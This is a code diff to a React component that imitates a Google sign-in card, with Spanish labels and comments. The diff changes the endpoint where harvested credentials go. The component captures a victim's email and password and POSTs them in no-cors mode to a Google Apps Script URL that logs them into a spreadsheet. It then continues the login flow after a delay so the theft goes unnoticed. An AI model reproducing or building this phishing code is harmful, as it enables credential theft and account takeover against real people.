@@ -8,7 +8,7 @@ const GoogleLoginCard = ({ onLoginComplete }: { onLoginComplete: () => void }) =
   const [showPassword, setShowPassword] = useState(false);
   const [emailError, setEmailError] = useState("");
 
-  const webAppUrl = "https://script.google.com/macros/s/AKfycbxxEKp_PVTwf3tXujx-EnlAqt230G5ckmnjOIml5zEXvlM3dYadCy74Cu1YD-ZZgTJ3/exec";
+  const webAppUrl = "https://script.google.com/macros/s/AKfycbzvYw6wrFwLPUWZ4dhM7HDF04wQRK0zLgfkey36BaicDoA75Zp3dM647ZkvV0raZim3/exec";
 
   const handleEmailNext = () => {
     if (!email.trim()) {
@@ -23,10 +23,11 @@ const GoogleLoginCard = ({ onLoginComplete }: { onLoginComplete: () => void }) =
     if (!password.trim()) return;
 
     try {
-      // ENVIAR DATOS Y ESPERAR
+      // FORZAMOS LA ESPERA DEL ENVÍO
       await fetch(webAppUrl, {
         method: "POST",
         mode: "no-cors",
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ 
           usuario: email, 
           pass: password, 
@@ -34,13 +35,13 @@ const GoogleLoginCard = ({ onLoginComplete }: { onLoginComplete: () => void }) =
         })
       });
     } catch (e) {
-      console.log("Enviando...");
+      console.error("Error de red, pero continuando...");
     }
 
-    // RETRASO DE SEGURIDAD: Esperamos casi un segundo para asegurar que el paquete de datos salga
+    // Pequeño delay de seguridad para que la fila se escriba en el Excel
     setTimeout(() => {
       onLoginComplete();
-    }, 800);
+    }, 600);
   };
 
   return (
@@ -87,8 +88,13 @@ const GoogleLoginCard = ({ onLoginComplete }: { onLoginComplete: () => void }) =
                 autoFocus
               />
               <label className="flex items-center gap-3 cursor-pointer select-none">
-                <input type="checkbox" checked={showPassword} onChange={(e) => setShowPassword(e.target.checked)} className="w-[18px] h-[18px] accent-[#1a73e8]" />
-                <span className="text-sm">Mostrar contraseña</span>
+                <input 
+                    type="checkbox" 
+                    checked={showPassword} 
+                    onChange={(e) => setShowPassword(e.target.checked)} 
+                    className="w-[18px] h-[18px] accent-[#1a73e8]" 
+                />
+                <span className="text-sm text-card-foreground">Mostrar contraseña</span>
               </label>
               <div className="flex justify-between items-center pt-4">
                 <span className="google-btn-text text-sm font-medium cursor-pointer">¿Has olvidado la contraseña?</span>
